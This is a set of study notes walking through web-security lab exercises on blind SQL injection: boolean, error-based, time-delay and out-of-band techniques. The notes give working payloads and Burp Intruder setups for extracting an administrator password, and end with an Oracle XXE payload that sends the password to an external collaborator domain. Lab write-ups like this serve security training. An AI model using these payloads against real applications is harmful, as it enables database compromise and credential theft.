#### 2.11. Lab: Blind SQL injection with conditional responses ⭕️
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

1. Send `GET /` request with `TrackingId` cookie to Repeater, add the following payload and Send. The SQL query is a true statement `1=1`. Note the Content Length: 11387.
	1. ![SQLi-20260108192940408](SQLi-20260108192940408.png)
	2. Change to `1=2` which is false and the Content Length is slightly different at 11386.
		1. **If this doesn't work, try URL encoding key characters**.
		2. ![SQLi-20260108193045397](SQLi-20260108193045397.png)
	3. Send both responses to Comparer and the `1=2` response *DOES NOT* contain the `Welcome back!` message. **This confirms a SQLi vulnerability**. So, if the SQL query we send is TRUE then we should see `Welcome back!`.
		1. ![SQLi-20260108193218731](SQLi-20260108193218731.png)
2. Check if `users` table exists with :`' AND (SELECT 'a' FROM users LIMIT 1)='a`. Confirming it exists. Same with the user administrator.
	1. ![SQLi-20260108193541952](SQLi-20260108193541952.png)
	2. ![SQLi-20260108193650469](SQLi-20260108193650469.png)
3. Check for the length of the password: `LENGTH(password)>2`. We will see `Welcome back!` because the password is greater than 2 characters. `>19` we get the message but `>20` we don't, the password is more than 19 chars but NOT more than 20 aka *20 characters*.
	1. ![SQLi-20260108193951854](SQLi-20260108193951854.png)
	2. ![SQLi-20260108193930273](SQLi-20260108193930273.png)
```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```
4. Guess the password using Burp Intruder:
	1. Use this payload **to guess each character at each position**: `' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`
	2. Cluster Bomb attack, 1st position FROM 1 TO 20, 2nd position add from list `a-z` and `0-9`, Resource Pool maximum concurrent requests: 1.
	3. If the correct password character was found, `Welcome back!` will appear so make a Grep - Match to find it. 
		1. ![187](SQLi-20260108195223009.png)
	4. Start attack. Sort the Welcome back column and when the correct character was found, there will be a `1`.
		1. ![SQLi-20260108195416436](SQLi-20260108195416436.png)
	5. Highlight all rows with Welcome back: 1 to a color, Filter settings: show only highlighted items, then you'll have the password.
		1. ![330](SQLi-20260108200427582.png)
5. Password is `evu652k1emmc62fsqg5u`. Use it to login as administrator and solved.

>This assumes the password only has numbers and/or lowercase letters. To guess for uppercase letters, add to list `A-Z`.

>[!tip] How to Identify this Vulnerability
>1. `TrackingId` cookie or another parameter that gives some sort of error or change of http response when you add a single quote `'`
>2. Differences in HTTP response depending on SQL queries (check HTTP response + Content Length)

- - -

#### 2.12. Lab: Blind SQL injection with conditional errors ⭕️
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
1. Adding a single quote `'` to a filter category *did not* get a 500 so this is not a SQL injection point.
	1. ![SQLi-20260121201804077](SQLi-20260121201804077.png)
2. Adding `'` to `TrackingId` cookie got a 500 so this is the **SQL injection point**. But send **2 single quotes `''` get us a 200 OK**.
	1. ![SQLi-20260125095420929](SQLi-20260125095420929.png)
3. Determine the db:
	1. Enter `'||(SELECT '')||'` (MySQL) but still got a 500. But we're looking for a 200 OK. So, try other payloads for other databases til we get a 200 OK.
		1. ![SQLi-20260125095642947](SQLi-20260125095642947.png)
	2. Enter `'||(SELECT '' FROM dual)||'` (Oracle) and got a 200 OK. **Confirming this app uses an Oracle db**.
		1. ![461](SQLi-20260125100412490.png)
>Even tho this app uses an Oracle db, why didn't any of these payloads work but the one in the solution did?
>![314](SQLi-20260125100051098.png)
4. Try entering a table that doesn't exist: `'||(SELECT '' FROM not-a-real-table)||'` and notice a 500 code. **This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.**
	1. ![SQLi-20260125100558293](SQLi-20260125100558293.png)
5. Verify if `users` table exists:
	1. Enter `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` and got a 200 OK confirming `users` table does exist. *`WHERE ROWNUM = 1` is needed here*.
		1. ![SQLi-20260125100935488](SQLi-20260125100935488.png)
6. Verify if `administrator` user exists in `users` table:
	1. Enter `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` and got a 500 code. Change the `(1=2)` will get a 200 OK. Confirming you can trigger an **error conditionally on the truth of a specific condition**.
		1. ![SQLi-20260125101556104](SQLi-20260125101556104.png)
	2. Enter `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` and notice a 500 code. **This means that the `administrator` user exists!** If you change the username to a user that does not exist, you will get a 200 OK.
		1. ![SQLi-20260125102113829](SQLi-20260125102113829.png)
		2. ![SQLi-20260125102130671](SQLi-20260125102130671.png)
7. Determine the password length:
	1. Enter `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` we get a 500 code meaning the password length is greater than 1. Keep increasing til you get a 200 OK or use Burp Repeater. At `>19` got a 500 but `>20` and got a 200 OK meaning the password length is **20 characters**.
		1. ![SQLi-20260125102403860](SQLi-20260125102403860.png)
8. Determine each character of the password:
	1. Enter `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` if the first character is `a` then we will get a 500 but if not, we get 200 OK. 
		1. ![SQLi-20260125102847200](SQLi-20260125102847200.png)
	2. Send to Intruder. Add a position around `$1$,1` and `$a$`. Cluster bomb attack. 
		1. ![SQLi-20260125103556103](SQLi-20260125103556103.png)
		2. Payload position 1: Numbers > From: 1, To: 20, Step: 1.
		3. Payload position 2: Brute Forcer, min length: 1, max length: 1. #Useful **When guessing alphanumeric characters, use Brute Forcer**. 
	3. Filter settings: only show 5XX codes. Sort Payload 1. The characters under Payload 2 makes up the password. Login as `administrator:wsisbwpgjnc4guy6ryoa` to solve.
		1. ![237](SQLi-20260125103750912.png)
>[!tip] How to Identify this Vulnerability?
>1. Filter feature single quote `'` got 200 OK
>2. `TrackingId` cookie and adding `'` got a 500 but 2 single quotes `''` got a 200 OK

---
#### 2.14. Lab: Blind SQL injection with time delays ⭕️
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
1. Use the SQLi cheat sheet and go to Time delays. Try each one and the payload that take the response ~10 seconds to come back is the database AND that this is vulnerable to SQLi.
	1. ![358](SQLi-20260121202602702.png)
2. Add `'+||+(` before the time delay command and `)--` after it.
	1. Payload: `'||+(SELECT+pg_sleep(10))--` 
		1. ![SQLi-20260121203053917](SQLi-20260121203053917.png)
		2. ![SQLi-20260121203108290](SQLi-20260121203108290.png)
3. Lab solved.
>[!tip] How to Identify this Vulnerability?
>1. Filter feature single quote `'` got 200 OK
>2. `TrackingId` cookie and adding `'` got **also got a 200 OK** due to this being a blind SQLi

---

#### 2.15. Lab: Blind SQL injection with time delays and information retrieval ⭕️
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

1. Notice the `/` request contains the following cookie: `TrackingId`. #ExamTip **Advanced search filters on the exam uses PostgreSQL**. 
2. Send the request and observe the quick response time: 110 milliseconds. Enter the payload below and notice the response time is now ~10 seconds (10,000 milliseconds) due to `sleep(10)`. **We've identified a blind SQLi vulnerability**.
	1. ![SQLi-20260108140246324](SQLi-20260108140246324.png)
#ExamTip 
```
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
 ![SQLi-20260108140611978](SQLi-20260108140611978.png)
![SQLi-20260108140626774](SQLi-20260108140626774.png)
3. Now we want to see if the administrator user exists. So the `1=1` condition is true so the `sleep(10)` ran and it took ~10 seconds for the response to come back. Replace `1=1` with `username='adminstrator'` and replace `END` with `END+FROM+users` because we know there is a table called users. Verdict: response took 10 seconds so this **confirms that the administrator user exists in the database**. 
	1. ![SQLi-20260108141214888](SQLi-20260108141214888.png)
	2. ![SQLi-20260108141223970](SQLi-20260108141223970.png)
4. Check password length: add `+AND+LENGTH(password)>1` to check the length of administrator's password length. Below is the manual way to determine the length. *But use Burp Intruder to automate the process AND guess the password at the same time*.
	1. When we enter `>20`  the response time was 100 millis so the password length is not 21 or more characters.
	2. When we enter `>19` the response time was ~10,000 millis so the **password length is 20**.
		1. ![SQLi-20260108142534394](SQLi-20260108142534394.png)
		2. ![SQLi-20260108142547247](SQLi-20260108142547247.png)
5. Burp Intruder method:
	1. Changing the `LENGTH` part to `SUBSTRING(password,1,1)='$a$'`, in Intruder, notice the payload position for `a` and payloads are `a-z` and `0-9`, the longest response time will give us the correct first character of the password.
		1. ![SQLi-20260108143410816](SQLi-20260108143410816.png)
		2. ![SQLi-20260108143420310](SQLi-20260108143420310.png)
	2. Cluster Bomb attack
		1. Set the payload positions like so: `SUBSTRING(password,$1$,1)='$a$')`
		2. First payload position > Numbers > From 1 To 20 (*check the 1st character all the way to the 20th*)
		3. Second payload position > Simple list > Add to list a-z and 0-9
		4. Resource Pool > check Maximum concurrent requests to 1
		5. Start attack and sort Response received column
		6. Highlight all rows with response times of 10,000 millis > assign a color > Filter settings: show only highlighted rows > sort by Payload 1 **then you have each character of the admin's password**.
6. The password is `hrdrmonruoe9dxvqqwxt`. Login and solve.

Payload appended to `TrackingId` on Step 5:
```
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
>[!tip] Blind SQLi Escapes #ExamTip 
>The payload above used a single quote `'` to escape which allowed us to enter the payload. But if that doesn't work, try a semicolon `;` but will need to URL encode it to `%3B`. Like this: `;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

>[!tip] How to Identify this Vulnerability
>1. `TrackingId` cookie or another parameter that gives some sort of error or change of http response when you add a single quote `'`
>2. Try SQLi payload and if it works like sleep(10), then it is vulnerable

---

#### 2.16. Lab: Blind SQL injection with out-of-band interaction ⭕️
*This lab is a prequel to Lab 2. Identical but this one only asked to perform a DNS lookup to burp collaborator but Lab 2 asked to exfiltrate data.*

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

1. Send `/` request to Repeater (one with `TrackingId` cookie), enter the payload below, and solve. Have to insert your burp collaborator domain. Successfully got a DNS lookup request.
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
![SQLi-20260108192042554](SQLi-20260108192042554.png)
![SQLi-20260108192129938](SQLi-20260108192129938.png)

>[!tip] How to Identify this Vulnerability
>1. `TrackingId` cookie or another parameter that gives some sort of error or change of http response when you add a single quote `'`
>2. We get a DNS request to burp collaborator (use Burp SQLi cheat sheet)

- - -

#### 2.17. Lab: Blind SQL injection with out-of-band data exfiltration ⭕️
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
*This is also an XXE vulnerability*.
1. Refresh the page and check the `/` request and see a `TrackingId` cookie.
2. Use the steps at the top of this page to determine the db of this web app (it's Oracle)
3. Grab the Oracle payload under DNS lookup with data exfiltration at the Burp SQLi cheat sheet
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
4. Make these changes:
	1. Include these characters around the payload like `' || (PAYLOAD)--` *IMPORTANT*: include the parentheses `()`.
	2. Add our burp collaborator domain
	3. Add the query
	4. Include necessary characters like `+ || (PAYLOAD)--`
	5. URL encode key characters the entire thing
#ExamTip Final Payload:
**Make sure the necessary extra characters are included**
```
'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.t82up7p79g94lqb7vfvszmcgi7o9cz0o.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
```
5. Login using `fz5f9fik2y69p39vbjty` as the password and solved.
	1. ![SQLi-20260108154207443](SQLi-20260108154207443.png)
>[!tip] How to Identify this Vulnerability
>1. `TrackingId` cookie or another parameter that gives some sort of error or change of http response when you add a single quote `'`
>2. We get a DNS request to burp collaborator (use Burp SQLi cheat sheet)

- - -
